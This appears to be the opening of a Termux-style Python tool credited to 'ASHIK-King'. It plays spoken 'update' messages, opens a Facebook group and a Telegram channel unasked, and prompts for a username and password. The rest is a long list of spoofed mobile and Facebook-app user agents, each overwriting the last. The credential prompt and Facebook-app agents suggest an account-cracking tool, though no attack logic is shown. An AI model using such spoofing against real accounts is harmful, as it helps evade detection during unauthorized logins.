#-----------------[ ASHIK-King ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ ASHIK-King ]-------------------#
import os, platform, time, sys
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install httpx pip install beautifulsoup4')
#os.system('pip install requests ')
#os.system('pip install bs4')
#os.system('pip install rich')
#os.system('pip install urillb3')
#os.system("pkg install espeak")
#os.system("pkg update")
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
os.system("espeak -a 300 \"Checking,Update,9.9\"")
time.sleep(2)
#os.system('clear')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 9.9V...! ')
os.system("espeak -a 300 \"UPDATE VERSION 9.9,\"")
time.sleep(2)
#os.system('clear')
print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m JOIN MY FACEBOOK GORUP ..!")
os.system("espeak -a 300 \"JOIN,MY,FACEBOOK,GORUP,\"")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/XXXXXXXXXXXXPTREWQR034YUUR?mibextid=vk8aRt')
os.system(f'xdg-open https://t.me/art123Termux')
os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
#------------------[ ASHIK-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 4.4.2; GT-S7562L Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/11.6.2.4",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-S7562 Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-S7562i Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-S7562L Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 12;CPH2365 Build/RKQ1.211119.001; wv)AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/103.0.5060.129Mobile Safari/537.36 [FB_IAB/OrcaAndroid;FBAV/372.0.0.10.112;",]
ua = ["Mozilla/5.0 (Linux; U; Android 10;Device HUAWEI Mate 20 lite)AppleWebkit/534.30 (KHTML, likeGecko) Version/4.0 Mobile Safari534.30 Spotify/860200774 (6; 2; 7)",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.364.",]
ua = ["Mozilla/5.0 (Linux; Android 9; itel L5503 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/320.0.0.12.108;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 12; en-US; TECNO KI5k Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.5.5.1313 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Z30 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; Infinix X604) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4652.156 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; LH9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61",]
ua = ["Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3371 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3506 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3311 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; 23030RAC7Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/378.0.0.12.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.34.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2209116AG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",]
ua = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",]
ua = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",]
ua = ["Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",]
ua = ["Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",]
ua = ["Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",]
ua = ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",]
ua = ["Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4",]
ua = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",]
